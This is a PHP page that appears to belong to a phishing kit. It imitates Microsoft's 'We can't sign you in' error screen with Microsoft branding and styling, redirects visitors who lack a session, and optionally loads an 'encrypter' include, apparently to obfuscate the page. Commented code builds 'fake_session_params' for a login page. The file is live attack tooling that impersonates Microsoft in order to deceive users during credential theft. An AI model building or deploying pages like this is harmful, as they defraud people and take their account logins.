<?php
@ob_start();
session_start();
if (!isset($_SESSION['SESSION_ID'])) {
    header("location: index.php");
    exit;
}

include_once 'inc/config.php';
include_once 'inc/functions.php';
//$session = isset($_GET['session']) ? $_GET['session'] : '';
//$fake_session_params = "login.php?auth=1&header=1&session=" . $session;
?>


<!DOCTYPE>
<html dir="ltr" lang="en">

<head>
    <?php
        if ($enable_encrypter) {
            require_once 'inc/encrypter.php';
        }
        ?>
    <title>Something went wrong</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedDownLevelError" />
    <meta name="SiteID" content="" />
    <meta name="ReqLC" content="1033" />
    <meta name="LocLC" content="en-US" />

    
        <link rel="shortcut icon" href="./assets/favicon_a.ico" />

<link href="./assets/Converged1033.css" rel="stylesheet" />
</head>

<body>
    <div>
        <div class="outer">
            <div class="middle">
                <div class="inner relative">
                        <img src="./assets/microsoft_logo.png" alt="Microsoft account symbol" />

                    <div class="row text-title" role="heading">We can&#39;t sign you in</div>

                        <div class="row form-group">JavaScript is required to sign in. Your browser either does not support JavaScript or it is being blocked.</div>
                        <div class="row form-group">Enable JavaScript in your browser or use one which supports it.</div>
                </div>
            </div>
        </div>

        <div class="footer default">
            <div id="footerLinks" class="footerNode text-secondary">
                    <div class="footerNode">
                        <span>
&#169;2018 Microsoft                        </span>
                        <a href="#" target="_blank">Terms of use</a>
                        <a href="#" target="_blank">Privacy &amp; cookies</a>
                    </div>
            </div>
        </div>
    </div>
</body>
</html>
<?php ob_end_flush(); ?>